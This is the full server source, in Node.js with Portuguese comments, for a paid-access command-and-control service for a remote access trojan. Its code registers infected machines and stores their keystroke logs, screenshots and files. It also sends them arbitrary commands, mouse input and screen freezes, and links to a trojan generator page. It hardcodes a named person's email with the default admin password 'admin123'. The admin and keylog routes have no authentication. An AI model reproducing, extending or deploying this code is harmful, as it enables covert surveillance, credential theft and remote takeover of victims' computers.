const express = require("express");
const bcrypt = require("bcrypt");
const cors = require("cors");
const WebSocket = require("ws");
const http = require("http");
const path = require("path");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const initSqlJs = require("sql.js");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: "100mb" }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let db = null;
const DB_FILE = "database.db";

function saveDatabase() {
    if (db) {
        const data = db.export();
        const buffer = Buffer.from(data);
        fs.writeFileSync(DB_FILE, buffer);
        console.log("💾 Banco de dados salvo");
    }
}

async function loadDatabase() {
    const SQL = await initSqlJs();
    
    if (fs.existsSync(DB_FILE)) {
        const fileBuffer = fs.readFileSync(DB_FILE);
        db = new SQL.Database(fileBuffer);
        console.log("📁 Banco carregado");
    } else {
        db = new SQL.Database();
        console.log("🆕 Novo banco criado");
        
        // Criar tabelas
        db.run(`CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            is_paid INTEGER DEFAULT 0,
            expires_at INTEGER,
            api_key TEXT,
            created_at INTEGER
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            agent_id TEXT UNIQUE NOT NULL,
            hostname TEXT,
            os TEXT,
            ip TEXT,
            last_seen INTEGER,
            first_seen INTEGER,
            status TEXT DEFAULT 'online',
            frozen INTEGER DEFAULT 0,
            controlled INTEGER DEFAULT 0
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            command TEXT NOT NULL,
            result TEXT,
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            executed_at INTEGER
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            data TEXT NOT NULL,
            created_at INTEGER
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            image_data TEXT,
            created_at INTEGER
        )`);
        
        db.run(`CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            file_name TEXT,
            file_data TEXT,
            created_at INTEGER
        )`);
        
        saveDatabase();
    }
    
    setInterval(saveDatabase, 10000);
}

// Helpers
function dbGet(query, params = []) {
    const stmt = db.prepare(query);
    stmt.bind(params);
    if (stmt.step()) {
        const result = stmt.getAsObject();
        stmt.free();
        return result;
    }
    stmt.free();
    return null;
}

function dbAll(query, params = []) {
    const stmt = db.prepare(query);
    stmt.bind(params);
    const results = [];
    while (stmt.step()) {
        results.push(stmt.getAsObject());
    }
    stmt.free();
    return results;
}

function dbRun(query, params = []) {
    const stmt = db.prepare(query);
    stmt.bind(params);
    stmt.step();
    const lastId = db.exec("SELECT last_insert_rowid() as id")[0]?.values[0]?.[0] || 0;
    stmt.free();
    return { lastInsertRowid: lastId, changes: 1 };
}

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (let name of Object.keys(interfaces)) {
        for (let iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

function getPublicIP() {
    return new Promise((resolve) => {
        const https = require('https');
        https.get('https://api.ipify.org', (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => resolve(data || getLocalIP()));
        }).on('error', () => resolve(getLocalIP()));
    });
}

function generateApiKey() {
    return crypto.randomBytes(32).toString('hex');
}

function generateAgentId() {
    return 'agt_' + crypto.randomBytes(8).toString('hex') + '_' + Date.now();
}

// ============================================================
// WEBSOCKET
// ============================================================
const agents = new Map();
const userAgents = new Map();

wss.on("connection", (ws, req) => {
    console.log(`🟢 Nova conexão WebSocket`);
    let authenticated = false;
    let currentAgentId = null;
    let currentUserId = null;
    
    ws.on("message", async (data) => {
        try {
            const message = JSON.parse(data.toString());
            
            if (message.type === "auth_agent") {
                const { agent_id, api_key, hostname, os, ip } = message;
                
                const user = dbGet(`
                    SELECT id, is_paid, expires_at, is_admin
                    FROM users 
                    WHERE api_key = ? AND (is_paid = 1 OR is_admin = 1)
                `, [api_key]);
                
                if (!user) {
                    ws.send(JSON.stringify({ type: "auth_failed", reason: "Invalid API key" }));
                    ws.close();
                    return;
                }
                
                authenticated = true;
                currentAgentId = agent_id;
                currentUserId = user.id;
                
                const existing = dbGet("SELECT * FROM agents WHERE agent_id = ?", [agent_id]);
                
                if (!existing) {
                    dbRun(`
                        INSERT INTO agents (user_id, agent_id, hostname, os, ip, first_seen, last_seen)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    `, [user.id, agent_id, hostname, os, ip, Date.now(), Date.now()]);
                } else {
                    dbRun(`
                        UPDATE agents SET last_seen = ?, status = 'online', ip = ?, hostname = ?, os = ?
                        WHERE agent_id = ?
                    `, [Date.now(), ip, hostname, os, agent_id]);
                }
                
                agents.set(agent_id, { ws, userId: user.id });
                
                if (!userAgents.has(user.id)) {
                    userAgents.set(user.id, new Set());
                }
                userAgents.get(user.id).add(agent_id);
                
                ws.send(JSON.stringify({ type: "auth_success", message: "Connected" }));
                
                console.log(`✅ Agent conectado: ${agent_id}`);
            }
            
            else if (message.type === "command_result" && authenticated) {
                const { command_id, result } = message;
                dbRun(`UPDATE commands SET result = ?, status = 'completed', executed_at = ? WHERE id = ?`, [result, Date.now(), command_id]);
                
                if (userAgents.has(currentUserId)) {
                    for (const aid of userAgents.get(currentUserId)) {
                        const a = agents.get(aid);
                        if (a && a.ws && a.ws.readyState === WebSocket.OPEN) {
                            a.ws.send(JSON.stringify({ type: "command_completed", command_id, result }));
                        }
                    }
                }
            }
            
            else if (message.type === "keylog_data" && authenticated) {
                const { data } = message;
                dbRun(`INSERT INTO keylogs (agent_id, data, created_at) VALUES (?, ?, ?)`, [currentAgentId, data, Date.now()]);
                
                if (userAgents.has(currentUserId)) {
                    for (const aid of userAgents.get(currentUserId)) {
                        const a = agents.get(aid);
                        if (a && a.ws && a.ws.readyState === WebSocket.OPEN) {
                            a.ws.send(JSON.stringify({ type: "new_keylog", agent_id: currentAgentId, data }));
                        }
                    }
                }
            }
            
            else if (message.type === "screenshot_data" && authenticated) {
                const { image_data } = message;
                dbRun(`INSERT INTO screenshots (agent_id, image_data, created_at) VALUES (?, ?, ?)`, [currentAgentId, image_data, Date.now()]);
                
                if (userAgents.has(currentUserId)) {
                    for (const aid of userAgents.get(currentUserId)) {
                        const a = agents.get(aid);
                        if (a && a.ws && a.ws.readyState === WebSocket.OPEN) {
                            a.ws.send(JSON.stringify({ type: "new_screenshot", agent_id: currentAgentId, image_data }));
                        }
                    }
                }
            }
            
            else if (message.type === "heartbeat" && authenticated) {
                dbRun("UPDATE agents SET last_seen = ? WHERE agent_id = ?", [Date.now(), currentAgentId]);
                ws.send(JSON.stringify({ type: "heartbeat_ack" }));
            }
            
        } catch (err) {
            console.error("WebSocket error:", err);
        }
    });
    
    ws.on("close", () => {
        if (currentAgentId) {
            console.log(`🔴 Agent desconectado: ${currentAgentId}`);
            dbRun("UPDATE agents SET status = 'offline' WHERE agent_id = ?", [currentAgentId]);
            agents.delete(currentAgentId);
        }
    });
});

// ============================================================
// API ROUTES
// ============================================================

app.get("/api/myip", async (req, res) => {
    const localIP = getLocalIP();
    const publicIP = await getPublicIP();
    res.json({ localIP, publicIP });
});

app.get("/api/agents", (req, res) => {
    const { email, api_key } = req.headers;
    const user = dbGet("SELECT id FROM users WHERE email = ? AND api_key = ?", [email, api_key]);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    
    const agentsList = dbAll(`SELECT agent_id, hostname, os, ip, last_seen, status, frozen, controlled FROM agents WHERE user_id = ?`, [user.id]);
    res.json(agentsList);
});

app.post("/api/send_command", (req, res) => {
    const { email, api_key, agent_id, command } = req.body;
    const user = dbGet("SELECT id FROM users WHERE email = ? AND api_key = ?", [email, api_key]);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    
    const result = dbRun(`INSERT INTO commands (agent_id, command, created_at) VALUES (?, ?, ?)`, [agent_id, command, Date.now()]);
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "command", id: result.lastInsertRowid, command }));
    }
    
    res.json({ id: result.lastInsertRowid, status: "sent" });
});

app.post("/api/freeze_screen", (req, res) => {
    const { email, api_key, agent_id, frozen } = req.body;
    const user = dbGet("SELECT id FROM users WHERE email = ? AND api_key = ?", [email, api_key]);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    
    dbRun("UPDATE agents SET frozen = ? WHERE agent_id = ?", [frozen ? 1 : 0, agent_id]);
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "freeze_screen", frozen }));
    }
    
    res.json({ success: true, frozen });
});

app.post("/api/set_control", (req, res) => {
    const { email, api_key, agent_id, controlled } = req.body;
    const user = dbGet("SELECT id FROM users WHERE email = ? AND api_key = ?", [email, api_key]);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    
    dbRun("UPDATE agents SET controlled = ? WHERE agent_id = ?", [controlled ? 1 : 0, agent_id]);
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "set_control", controlled }));
    }
    
    res.json({ success: true, controlled });
});

app.post("/api/send_mouse", (req, res) => {
    const { email, api_key, agent_id, x, y, button } = req.body;
    const user = dbGet("SELECT id FROM users WHERE email = ? AND api_key = ?", [email, api_key]);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "mouse_control", x, y, button }));
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Agent offline" });
    }
});

app.get("/api/get_keylogs", (req, res) => {
    const { agent_id, limit = 100 } = req.query;
    const keylogs = dbAll(`SELECT data, created_at FROM keylogs WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?`, [agent_id, limit]);
    res.json(keylogs);
});

app.get("/api/get_screenshots", (req, res) => {
    const { agent_id, limit = 10 } = req.query;
    const screenshots = dbAll(`SELECT image_data, created_at FROM screenshots WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?`, [agent_id, limit]);
    res.json(screenshots);
});

// ============================================================
// AUTH ROUTES - CORRIGIDO PARA ADMIN
// ============================================================

app.post("/register", async (req, res) => {
    const { username, email, password } = req.body;
    
    if (!username || !email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    
    try {
        const existing = dbGet("SELECT * FROM users WHERE email = ?", [email]);
        if (existing) {
            return res.status(400).json({ error: "Email já cadastrado" });
        }
        
        const hash = await bcrypt.hash(password, 10);
        const api_key = generateApiKey();
        
        dbRun(`INSERT INTO users (username, email, password, api_key, created_at) VALUES (?, ?, ?, ?, ?)`, 
            [username, email, hash, api_key, Date.now()]);
        
        res.json({ success: true, message: "Conta criada com sucesso!", api_key });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    
    try {
        const user = dbGet("SELECT * FROM users WHERE email = ? OR username = ?", [email, email]);
        
        if (!user) {
            return res.status(400).json({ error: "Usuário não encontrado" });
        }
        
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(400).json({ error: "Senha incorreta" });
        }
        
        const now = Date.now();
        const isAdmin = user.is_admin === 1;
        const isActivePaid = user.is_paid === 1 && (!user.expires_at || user.expires_at > now);
        
        // ============================================================
        // REGRA DE REDIRECIONAMENTO:
        // - Se for ADMIN (email luismetzker9@gmail.com) -> admin.html
        // - Se tiver acesso pago -> trojan_panel.html
        // - Senão -> dashboard.html
        // ============================================================
        let redirect = "dashboard.html";
        
        if (isAdmin) {
            redirect = "admin.html";
            console.log(`👑 Admin logado: ${user.email} -> redirecionando para admin.html`);
        } else if (isActivePaid) {
            redirect = "trojan_panel.html";
            console.log(`✅ Usuário pago logado: ${user.email} -> redirecionando para trojan_panel.html`);
        } else {
            console.log(`⚠️ Usuário sem acesso: ${user.email} -> redirecionando para dashboard.html`);
        }
        
        res.json({
            success: true,
            message: "Login realizado com sucesso!",
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                is_admin: user.is_admin,
                is_paid: user.is_paid,
                api_key: user.api_key
            },
            redirect
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

// ============================================================
// ADMIN ROUTES
// ============================================================

app.get("/admin/make", (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).send("Email required");
    
    dbRun("UPDATE users SET is_admin = 1, is_paid = 1 WHERE email = ?", [email]);
    res.send(`✅ ${email} agora é administrador com acesso total!`);
});

app.post("/admin/grant", (req, res) => {
    const { email, plan } = req.body;
    
    let durationDays = plan === "monthly" ? 30 : plan === "yearly" ? 365 : 0;
    if (!durationDays) {
        return res.status(400).json({ error: "Plano inválido" });
    }
    
    const expires_at = Date.now() + (durationDays * 24 * 60 * 60 * 1000);
    dbRun("UPDATE users SET is_paid = 1, expires_at = ? WHERE email = ?", [expires_at, email]);
    
    res.json({ success: true, message: `Acesso liberado para ${email}` });
});

app.post("/admin/revoke", (req, res) => {
    const { email } = req.body;
    dbRun("UPDATE users SET is_paid = 0, expires_at = NULL WHERE email = ?", [email]);
    res.json({ success: true, message: `Acesso removido para ${email}` });
});

app.get("/admin/users", (req, res) => {
    const users = dbAll(`SELECT id, username, email, is_paid, is_admin, expires_at, created_at FROM users ORDER BY created_at DESC`);
    res.json(users);
});

// ============================================================
// CRIAR ADMIN PADRÃO (luismetzker9@gmail.com)
// ============================================================
async function createDefaultAdmin() {
    const adminEmail = "luismetzker9@gmail.com";
    const adminPassword = "admin123";
    const adminUsername = "Luis Metzker";
    
    const existingAdmin = dbGet("SELECT * FROM users WHERE email = ?", [adminEmail]);
    
    if (!existingAdmin) {
        const hash = await bcrypt.hash(adminPassword, 10);
        const api_key = generateApiKey();
        
        dbRun(`
            INSERT INTO users (username, email, password, is_admin, is_paid, api_key, created_at)
            VALUES (?, ?, ?, 1, 1, ?, ?)
        `, [adminUsername, adminEmail, hash, api_key, Date.now()]);
        
        console.log("\n╔════════════════════════════════════════════════════════════════╗");
        console.log("║         🔐 ADMIN CRIADO AUTOMATICAMENTE                       ║");
        console.log("╠════════════════════════════════════════════════════════════════╣");
        console.log(`║ 📧 Email: ${adminEmail}`);
        console.log(`║ 🔑 Senha: ${adminPassword}`);
        console.log(`║ 👤 Usuário: ${adminUsername}`);
        console.log(`║ 🎯 Tipo: ADMIN (Acesso total)`);
        console.log("╚════════════════════════════════════════════════════════════════╝\n");
    } else if (existingAdmin.is_admin !== 1) {
        // Se o usuário existe mas não é admin, tornar admin
        dbRun("UPDATE users SET is_admin = 1, is_paid = 1 WHERE email = ?", [adminEmail]);
        console.log(`\n✅ Usuário ${adminEmail} foi promovido a ADMIN!\n`);
    } else {
        console.log(`\n✅ Admin já existe: ${adminEmail}\n`);
    }
}

// ============================================================
// SERVIDOR ESTÁTICO
// ============================================================
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/trojan_panel.html", (req, res) => res.sendFile(path.join(__dirname, "public", "trojan_panel.html")));
app.get("/trojan_generator.html", (req, res) => res.sendFile(path.join(__dirname, "public", "trojan_generator.html")));
app.get("/admin.html", (req, res) => res.sendFile(path.join(__dirname, "public", "admin.html")));
app.get("/dashboard.html", (req, res) => res.sendFile(path.join(__dirname, "public", "dashboard.html")));
app.get("/signup.html", (req, res) => res.sendFile(path.join(__dirname, "public", "signup.html")));

// ============================================================
// START SERVER
// ============================================================
async function start() {
    await loadDatabase();
    await createDefaultAdmin();
    
    server.listen(PORT, async () => {
        const localIP = getLocalIP();
        const publicIP = await getPublicIP();
        
        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║              🔥 C2 SERVER ULTIMATE INICIADO 🔥                 ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ 🌐 Local:    http://${localIP}:${PORT}`);
        console.log(`║ 🌍 Público:  http://${publicIP}:${PORT}`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ 📱 Painel Admin:  http://${publicIP}:${PORT}/admin.html`);
        console.log(`║ 🎮 Painel C2:     http://${publicIP}:${PORT}/trojan_panel.html`);
        console.log(`║ 🔧 Gerador RAT:   http://${publicIP}:${PORT}/trojan_generator.html`);
        console.log(`╚════════════════════════════════════════════════════════════════╝`);
    });
}

start();